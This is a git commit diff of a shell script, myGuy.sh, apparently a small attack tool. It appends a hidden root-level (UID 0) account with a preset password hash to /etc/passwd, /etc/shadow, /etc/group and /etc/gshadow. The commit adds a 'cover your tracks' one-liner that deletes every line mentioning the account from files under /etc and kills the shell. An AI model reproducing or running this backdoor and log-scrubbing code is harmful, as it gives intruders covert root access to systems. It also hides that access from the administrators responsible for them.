52ba7b67561c00ca4e83748c027ea3d281191422
jayrugman <jasonrhardman@gmail.com>
2021-09-03 11:22:57 -0600

    Added exit command to commends of myGuy.sh

--- myGuy.sh
+++ myGuy.sh
@@ -5,3 +5,7 @@ echo 'myGuy:x:0:0:myGuy:/root:/bin/bash' >> /etc/passwd
 echo 'myGuy:$6$SALT$Zi0dw2CyzzlM57TS8G5fSliJ9waapbJWCETyFMPQiNo6hxBLQoD5xuEQD2XNGnyC/PgAm/1CLqxeiI287fk6F.:18648:0:99999:7:::' >> /etc/shadow
 echo 'myGuy:x:0:' >> /etc/group
 echo 'myGuy:|::' >> /etc/gshadow
+
+# once done, enter the following command into the terminal to cover your tracks:
+## cd /etc/ && for i in $(grep -Rl myGuy 2>/dev/null); do echo "sed -i '/myGuy/d' $i" | sh; done && kill -9 $$
+
